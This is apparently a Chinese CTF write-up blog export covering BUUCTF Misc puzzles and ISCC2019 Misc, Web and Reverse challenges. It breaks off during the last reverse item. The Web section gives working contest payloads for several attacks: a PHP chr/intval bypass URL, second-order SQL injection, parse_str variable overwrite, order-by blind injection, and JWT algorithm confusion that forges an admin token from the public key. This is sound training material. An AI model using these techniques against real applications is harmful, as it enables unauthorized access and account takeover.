<h2 id="BJDCTF2020-藏藏藏"><a href="#BJDCTF2020-藏藏藏" class="headerlink" title="[BJDCTF2020]藏藏藏"></a>[BJDCTF2020]藏藏藏</h2><p>winhex查看发现尾部有压缩包，解压缩是word，打开是二维码，扫码得flag</p>
<h2 id="BJDCTF2020-认真你就输了"><a href="#BJDCTF2020-认真你就输了" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h2><p>用excel直接打开表格发现内容有问题，winhex查看发现这是xlsx格式的表格，而且看到了flag.txt的路径，直接解压打开，拿到flag</p>
<h2 id="我爱Linux"><a href="#我爱Linux" class="headerlink" title="我爱Linux"></a>我爱Linux</h2><p>感觉这题和Linux没啥关系，不如直接叫我爱python。<br>谷歌识图得知这张图片的团体名字指向python，再用google搜索关键词 <code>python</code> <code>80 03</code> ，得知这是用python生成的序列化文件，可以用 python 的 <code>pickle</code> 模块读取其内容。发现似乎是坐标元组组成的列表，将其字符按照坐标值写入文本，打开文本看到排列为flag的内容。（注意： <strong>转出来的字符形状要仔细观察细节区分清楚，比如里面的 a 和 e</strong> ）<br>附上搜到的python序列化相关文章地址：<a href="https://diego.assencio.com/?index=99d3134bb98fdcc9a7c2bd6071db737d">https://diego.assencio.com/?index=99d3134bb98fdcc9a7c2bd6071db737d</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = pickle.load(f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        x = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> data[i]:</span><br><span class="line">            f.write(<span class="string">&#x27; &#x27;</span>*(j[<span class="number">0</span>]-x-<span class="number">1</span>) + j[<span class="number">1</span>])</span><br><span class="line">            x = j[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="BJDCTF2020-just-a-rar"><a href="#BJDCTF2020-just-a-rar" class="headerlink" title="[BJDCTF2020]just_a_rar"></a>[BJDCTF2020]just_a_rar</h2><p>名字四位数，爆破，解压是一张jpg，右键属性，详细信息里看到flag</p>
<h2 id="BJDCTF2020-一叶障目"><a href="#BJDCTF2020-一叶障目" class="headerlink" title="[BJDCTF2020]一叶障目"></a>[BJDCTF2020]一叶障目</h2><p>winhex修改png图片高度拿到flag</p>
<h2 id="BJDCTF2020-鸡你太美"><a href="#BJDCTF2020-鸡你太美" class="headerlink" title="[BJDCTF2020]鸡你太美"></a>[BJDCTF2020]鸡你太美</h2><p>打开是两个gif，第二个gif格式错误，winhex打开发现少了四个字节的文件头，添加后打开gif即可看到flag</p>
<h2 id="BJDCTF2020-纳尼"><a href="#BJDCTF2020-纳尼" class="headerlink" title="[BJDCTF2020]纳尼"></a>[BJDCTF2020]纳尼</h2><p>解压是一个格式损坏的gif，winhex修复文件头，发现是一段段字符，提取出来，拼在一起解base64即可，这里我解得结果中间错了一个字母不知道为什么，不过根据结果能猜出来错的这个字符应该是什么</p>
<h2 id="百里挑一"><a href="#百里挑一" class="headerlink" title="百里挑一"></a>百里挑一</h2><p>流量包分析，发现很多jpg文件，导出http对象，linxu下用exiftool工具加管道符快速搜索一下有没有提示，发现一半flag<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages百里挑一1.png" alt="百里挑一1.png"><br>后一半flag应该是还在流量包里，因为之前看到有大量ftp流量，回去查看ftp流量，果然通过ftp也下载了大量jpg，想到流量包中的数据一般也都是直接存储明文，尝试使用<code>strings</code>命令直接搜寻flag，这里需要用 <code>-el</code> 参数指定数据存储的大小端方式，不然会发现没有找到flag<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages百里挑一2.png" alt="百里挑一2.png"></p>
<p>flag{ae58d0408e26e8f26a3c0589d23edeec}</p>
<h2 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h2><p>这个比赛当时参加了，找不到自己的writeup放哪了，直接给<a href="https://xz.aliyun.com/t/6911#toc-24">官方writeup链接</a></p>
<h2 id="静静听这么好听的歌"><a href="#静静听这么好听的歌" class="headerlink" title="静静听这么好听的歌"></a>静静听这么好听的歌</h2><p>电脑最近重置了，matlab装着太麻烦，直接附上<a href="https://blog.csdn.net/zrools/article/details/50630780?utm_source=blogxgwz2">表哥的wp</a></p>
<h2 id="Business-Planning-Group"><a href="#Business-Planning-Group" class="headerlink" title="Business Planning Group"></a>Business Planning Group</h2><p>winhex打开发现结尾跟了一大段未知数据，数据开头是连续三个大写字母 <code>BPG</code> (这里再次吐槽谷歌还是你谷歌，<del>一开始我用百度搜关键词没搜出来，可能是我的关键词没加图像相关关键词的缘故</del>。嗯，就在我打出这句话的时候我又去试了下，百度搜出来了，有百科，而且第一条结果就是emmmm)这是一种新的图像文件格式，大概意思是既像png一样保证质量又像jpg一样保证空间。进入其官网，有在线查看器，直接查看图片内容<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesBPG.png" alt="BPG.png"><br>明显是一串base64，解base64得flag</p>
<h2 id="安洵杯-2019-easy-misc"><a href="#安洵杯-2019-easy-misc" class="headerlink" title="[安洵杯 2019]easy misc"></a>[安洵杯 2019]easy misc</h2><p>套娃，丢，<a href="https://xz.aliyun.com/t/6911#toc-30">官方wp</a></p>
<h2 id="请移步篇章三"><a href="#请移步篇章三" class="headerlink" title="请移步篇章三"></a><a href="http://xibai.xyz/2020/02/24/BUU-Misc-three/">请移步篇章三</a></h2><h2 id="也可移步篇章一"><a href="#也可移步篇章一" class="headerlink" title="也可移步篇章一"></a><a href="http://xibai.xyz/2020/01/11/BUU-Misc-one/">也可移步篇章一</a></h2>]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC2019 Writeup</title>
    <url>/2019/05/26/ISCC%202019%20writeup/</url>
    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="1-隐藏的信息"><a href="#1-隐藏的信息" class="headerlink" title="1.隐藏的信息"></a>1.隐藏的信息</h2><p>下载压缩包，解压缩拿到一个文本文件，打开发现是一堆八进制，写个脚本来ASCII值转字符串，转完之后发现是一个base64加密，将一开始的脚本修改一下，添加base64转码功能，再次运行拿到flag</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">x=<span class="string">&quot;0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 &quot;</span> \  <span class="string">&quot;066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 &quot;</span> \  <span class="string">&quot;0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113 &quot;</span></span><br><span class="line">x = x.split()</span><br><span class="line">z = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(len(x)</span>):</span></span><br><span class="line"><span class="function">    y </span>= str(hex(<span class="keyword">int</span>(x[i], <span class="number">8</span>)))[<span class="number">2</span>:]  </span><br><span class="line">    a = str(binascii.a2b_hex(y))</span><br><span class="line">    z += str(a)</span><br><span class="line">z = base64.b64decode(z)</span><br><span class="line">print(z)</span><br></pre></td></tr></table></figure>
<h2 id="2-最危险的地方就是最安全的地方"><a href="#2-最危险的地方就是最安全的地方" class="headerlink" title="2.最危险的地方就是最安全的地方"></a>2.最危险的地方就是最安全的地方</h2><p>题目文件解压后是一张JPG图片，盲猜带有压缩包，后缀改为zip解压缩，拿到50张二维码，发现最后一张的图片文件格式和其它49张不一样，记事本打开，开头就看到flag</p>
<h2 id="3-解密成绩单"><a href="#3-解密成绩单" class="headerlink" title="3. 解密成绩单"></a>3. 解密成绩单</h2><p>题目文件解压后拿到一个exe文件，用各种misc做题方法尝试后均无果，猜测其实是简单的逆向题，用ida打开：<br>​​<br>看到检查输入的函数，跟入直接看到要求的用户名和密码，直接复制粘贴到程序输入框内点击ok即可拿到flag</p>
<h2 id="4-Welcome"><a href="#4-Welcome" class="headerlink" title="4. Welcome"></a>4. Welcome</h2><p>改后缀解压得到.txt文件，打开发现由“蓅烺計劃 洮蓠朩暒”和“戶囗  萇條”组成的编码，将前者用0替换，后者用1替换，得到011001100110110001100001011001110111101101001001010100110100001101000011010111110101011101000101010011000100001101001111010011010100010101111101<br>​​<br>二进制转到字符串即可得到flag</p>
<h2 id="5-倒立屋"><a href="#5-倒立屋" class="headerlink" title="5.倒立屋"></a>5.倒立屋</h2><p> lsb加密，使用stegsolve三色道分析神器查看lsb加密内容，然后将看到的字符，顺序反过来，即为flag ，是不是很坑</p>
<h2 id="6-无法运行的exe"><a href="#6-无法运行的exe" class="headerlink" title="6.无法运行的exe"></a>6.无法运行的exe</h2><p>解压题目后拿到exe文件，发现无法运行，winhex查看发现是个其实文本文件，文本内容像是图片base64转码，用在线base64转图片工具发现无法转图片，自己写个py脚本实现，如下：(将原文件名重命名为1.txt)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">d=base64.b64decode(a)</span><br><span class="line">filename=<span class="string">&#x27;2.png&#x27;</span></span><br><span class="line"><span class="function">with <span class="title">open</span><span class="params">(filename,<span class="string">&#x27;w&#x27;</span>)</span> as file_project:</span></span><br><span class="line"><span class="function"> file_project.<span class="title">write</span><span class="params">(d)</span></span></span><br></pre></td></tr></table></figure>
<p>打开2.txt查看发现是png文件，改为png后缀打开，发现报错，百度png文件格式，发现头部数据被修改了，改回来：<br>​​这是我们转码后拿到的文件开头hex值，png文件开头应为：<code>89504E470D0A1A0A</code><br>修复文件头后打开是二维码，用QR扫码工具扫描拿到flag</p>
<h2 id="7-High起来"><a href="#7-High起来" class="headerlink" title="7.High起来"></a>7.High起来</h2><p>解压缩拿到一个二维码图片，扫码后拿到一串当铺密码，在线工具解码拿到一串数字。个人觉得这不是flag，提交了一下尝试，果然不是，发现二维码图片大小异常，比普通二维码大了不少，猜测包含其他文件，binwalk跑一下发现压缩包，解压后是一段mp3音频，用mp3隐写工具解密，推测一开始拿到的数字是密钥，解密出来文本，是html编码，在线工具解码拿到flag</p>
<h2 id="8-他们能在一起吗"><a href="#8-他们能在一起吗" class="headerlink" title="8.他们能在一起吗"></a>8.他们能在一起吗</h2><p>首先得到一个二维码<br><img src="https://img-blog.csdnimg.cn/20190525100318202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q=<br>BASE64解密为：PASS{0K_I_L0V3_Y0u!}<br>从二维码分离出一个加密了的压缩包，用刚才得到的密钥解密的到含有flag的.txt文件<br>得到flag：ISCC{S0rrY_W3_4R3_Ju5T_Fr1END}</p>
<h2 id="9-Keyes’-secret"><a href="#9-Keyes’-secret" class="headerlink" title="9.Keyes’ secret"></a>9.Keyes’ secret</h2><p>仔细看一下文件开头的字母，结合提示，发现就是一个简单的键盘加密（画键盘），而且似乎每一个字母的加密方式都一样，用文本的替换功能即可获取原文。<br>        例：<br>        ​​<img src="https://img-blog.csdnimg.cn/20190525100424101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="10-Aesop’s-secret"><a href="#10-Aesop’s-secret" class="headerlink" title="10.Aesop’s secret"></a>10.Aesop’s secret</h2><p>动态图的每一帧只显示图片的一部分，用stegsolve神器的”Frame Browser”将其每一帧保存出来，用ps合成一下，或者用stegsolve的”Image Combiner”功能里的”add”直接将图片内容合到一起，发现图片内容是”ISCC”<br>        <img src="https://img-blog.csdnimg.cn/2019052510053222.png" alt="在这里插入图片描述"><br>再用stegsolve的 “File Format” 查看图片信息的时候发现其所转换的ascii码的内容是密文，<br>推测ISCC是密钥，通过两次<a href="https://www.bejson.com/enc/aesdes/">AES解密</a>拿到flag</p>
<h2 id="11-碎纸机"><a href="#11-碎纸机" class="headerlink" title="11.碎纸机"></a>11.碎纸机</h2><p>用binwalk检查下给出的这张jpg图片，发现有个压缩包，解压缩拿到10张拼图文件，提示说欧鹏曦文同学可以恢复其原貌，但要给它真正有用的东西，用winhex查看发现每张拼图文件结尾都多了一串等长的hex值，将其提取出来。根据谐音推测欧鹏曦文指的是opencv，是一种计算机视觉库，处理图形用的。应该是要把多出来的hex值转为图片，多出来的十串hex值长度都为2500，刚好是50*50，但是百度了好久也没有找到opencv创建图形文件后如何处理每个坐标处像素的教程，于是用了image库，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">X=<span class="number">50</span></span><br><span class="line">Y=<span class="number">500</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(X,Y))</span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">open</span>(<span class="string">&#x27;0.txt&#x27;</span>).read() <span class="comment">#我将十段hex值都写进一个txt文档了，方便处理</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,Y):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,X):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i] ==<span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line"><span class="comment">#                       _oo0oo_       虽  但  我</span></span><br><span class="line"><span class="comment">#                      o8888888o      然  没  的</span></span><br><span class="line"><span class="comment">#                      88&quot; . &quot;88      我  这  脚</span></span><br><span class="line"><span class="comment">#                      ( -_- )        并  段  本</span></span><br><span class="line"><span class="comment">#                      0\  =  /0      不  注  跑</span></span><br><span class="line"><span class="comment">#                    ___/`---&#x27;\___    迷  释  不</span></span><br><span class="line"><span class="comment">#                  .&#x27; \\     // &#x27;.    信  时  动</span></span><br><span class="line"><span class="comment">#                 / \\  :  // \       ，  ，  。</span></span><br><span class="line"><span class="comment">#                / _ -:- - \                 。</span></span><br><span class="line"><span class="comment">#                   \\\  -  ///              。</span></span><br><span class="line"><span class="comment">#                \_  &#x27;&#x27;\---/&#x27;&#x27;  _/</span></span><br><span class="line"><span class="comment">#               \  .-\__  &#x27;-&#x27;  ___/-. /</span></span><br><span class="line"><span class="comment">#             ___&#x27;. .&#x27;  /--.--\  `. .&#x27;___</span></span><br><span class="line"><span class="comment">#          .&quot;&quot; &#x27;&lt;  `.___\_&lt;&gt;_/___.&#x27; &gt;&#x27; &quot;&quot;.</span></span><br><span class="line"><span class="comment">#           :  `- \`.;`\ _ /`;.`/ - ` :  </span></span><br><span class="line"><span class="comment">#         \  \ `_.   \_ __\ /__ _/   .-` /  /</span></span><br><span class="line"><span class="comment">#     =====`-.____`.___ \_____/___.-`___.-&#x27;=====</span></span><br><span class="line"><span class="comment">#                       `=---=&#x27;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#               佛祖保佑         永无BUG</span></span><br></pre></td></tr></table></figure>
<p>图片内容被ps过，不过不影响查看flag</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-web1"><a href="#1-web1" class="headerlink" title="1.web1"></a>1.web1</h2><p> 查看源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(<span class="number">0</span>);</span><br><span class="line">require <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$value = $_GET[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$username = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>)</span><br><span class="line">    unset($value);</span><br><span class="line">    <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">&#x27;w3lc0me_To_ISCC2019&#x27;</span> &amp;&amp; intval($password) &lt; <span class="number">2333</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&#x27;Hello &#x27;</span>.$username.<span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&lt;br&gt;&#x27;</span>, PHP_EOL;</span><br><span class="line">        echo $flag, <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>发现关键的几个地方<br> 1.存在chr函数<br> 2.存在intval函数<br>由此，我们需要构造不同的value[i]，这里通过if过滤掉了username字符中出现的ascll码，但  是，chr函数在处理大于256的ascll时会对256进行取余，所以我们在原字符的ascll码上＋256即可。</p>
<p>intval由于存在弱类型转换的问题，在转换时的值会小1，轻松绕过判断，最终构造payload：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">http: <span class="comment">//39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0x91d</span></span><br></pre></td></tr></table></figure>
<h2 id="2-web2"><a href="#2-web2" class="headerlink" title="2.web2"></a>2.web2</h2><p> 提示3位数密码，不用说肯定是爆破。但是存在于验证码，我们先抓包<br><img src="https://img-blog.csdnimg.cn/20190525101130497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 我们去爆破却失败了，这是为什么呢？<br>关键就在于这个cookie<br><img src="https://img-blog.csdnimg.cn/20190525101118473.png" alt="在这里插入图片描述"><br> 不改变cookie，得到的结果永远都是一样的，所以这里我们直接删除cookie重新爆破。<br>  ​​看到996返回length不同，尝试用996去登录，得到Flag。</p>
<h2 id="3-web3"><a href="#3-web3" class="headerlink" title="3.web3"></a>3.web3</h2><p>二次注入，首先注册用户admin’—xx（xx代表任何字符，这里#好像被过滤了）,登陆之后修改密码,这里直接修改了admin的密码，再以修改的密码以admin为username登陆，拿到flag</p>
<h2 id="4-web4"><a href="#4-web4" class="headerlink" title="4.web4"></a>4.web4</h2><p>进来审计源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?<span class="function">php <span class="title">error_reporting</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line"> include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">  $hashed_key = <span class="string">&#x27;ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a&#x27;</span>;</span><br><span class="line">  $parsed = parse_url($_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">  <span class="keyword">if</span>(isset($parsed[<span class="string">&quot;query&quot;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">       $query = $parsed[<span class="string">&quot;query&quot;</span>];</span><br><span class="line">       $parsed_query = parse_str($query);</span><br><span class="line">       <span class="keyword">if</span>($parsed_query!=NULL)</span><br><span class="line">       &#123;</span><br><span class="line">            $action = $parsed_query[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>($action===<span class="string">&quot;auth&quot;</span>)</span><br><span class="line">       &#123;</span><br><span class="line">            $key = $_GET[<span class="string">&quot;key&quot;</span>];</span><br><span class="line">            $hashed_input = hash(<span class="string">&#x27;sha256&#x27;</span>, $key);</span><br><span class="line">            <span class="keyword">if</span>($hashed_input!==$hashed_key)</span><br><span class="line">            &#123;</span><br><span class="line">                  die(<span class="string">&quot;&lt;img src=&#x27;cxk.jpg&#x27;&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            echo $flag;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">     show_source(__FILE__);</span><br><span class="line">&#125;?&gt;</span><br></pre></td></tr></table></figure>
<p>审计发现，我们必须提供两个参数action和key，并且使用sha256进行哈希处理后必须等于代码顶部的哈希值。<br>首先试一下解密hashed_key的值，但是很不幸并没有解密出来。<br>但是我们看到出现parse_str()函数，变量覆盖的典型代表函数，所以直接变量覆盖掉hashed_key<br>构造payload：</p>
<p> action=auth&amp;key=test&amp;hashed_key=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08</p>
<h2 id="5-web5"><a href="#5-web5" class="headerlink" title="5.web5"></a>5.web5</h2><p>提示 看来你并不是Union.373组织成员，请勿入内！<br>改u-a头<br>后：请输入用户名<br>注入，过滤了圆括号，注释符，from等等<br>payload ：order by 排序盲注<br>​​<img src="https://img-blog.csdnimg.cn/20190525101601940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>改变’0’的值，通过排序，逐个爆出密码</p>
<h2 id="6-web6"><a href="#6-web6" class="headerlink" title="6.web6"></a>6.web6</h2><p>这是一个构造jwt头攻击的题目。<br>进入题目后查看源代码，在common.js文件里找到关键信息：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">function <span class="title">getpubkey</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">get the pubkey for test</span></span><br><span class="line"><span class="comment">/pubkey/&#123;md5(username+password)&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显是个公钥获取提示，将自己注册的用户名和密码合在一起取md5值,以此访问公钥文件。<br>拿到公钥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;pubkey&quot;</span>:<span class="string">&quot;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----&quot;</span>,<span class="string">&quot;result&quot;</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
<p>但很明显，公钥是有格式的，直接拿来用坑定不行，用python的print命令输出一下，防止人工修格式修错,然后将其复制到txt里</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20190525101845359.png" alt="在这里插入图片描述"><br>用这个公钥构造token头访问list</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">public</span> = open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">print (jwt.encode(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;xibai21&quot;</span>,<span class="string">&quot;priv&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;, key=<span class="keyword">public</span>, algorithm=<span class="string">&#x27;HS256&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>token头自然是抓包将原本的换为我们自行构造的token，注意token头中的name是自己的公钥对应的用户名，admin自然是管理员用户名。<br>发包后在list中看到关键信息：<br>​​<img src="https://img-blog.csdnimg.cn/20190525101855100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问/text/admin:。。。。。。，即可拿到flag</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="1-answer-to-everything"><a href="#1-answer-to-everything" class="headerlink" title="1.answer to everything"></a>1.answer to everything</h2><p>ida载入main函数一键f5，审计一波发现以下关键：<br>​​<img src="https://img-blog.csdnimg.cn/20190525101912167.png" alt="在这里插入图片描述"><br>不带任何标签提交，结合题目提示sha1， kdudpeh 的sha1值即为所要flag</p>
<h2 id="2-Rev03"><a href="#2-Rev03" class="headerlink" title="2.Rev03"></a>2.Rev03</h2><h2 id="3-dig-dig-dig"><a href="#3-dig-dig-dig" class="headerlink" title="3.dig dig dig"></a>3.dig dig dig</h2><p>用IDA载入分析<br>​​<img src="https://img-blog.csdnimg.cn/20190525101928828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现对字符串进行了三次加密<br>分别为BASE64,ROT13,UUencode<br>​​<img src="https://img-blog.csdnimg.cn/20190525101941509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对字符串逆着进行三次解密，得到flag<br>​​<img src="https://img-blog.csdnimg.cn/20190525101958100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="4-简单Python"><a href="#4-简单Python" class="headerlink" title="4.简单Python"></a>4.简单Python</h2><p>题目内容很简单<br>提示说要逆向一个pyc<br>虽然没有了解过这个东西，不过在网上找到了在线的反编译工具<br>直接拉进去  运行<br>得到如下内容：</p>
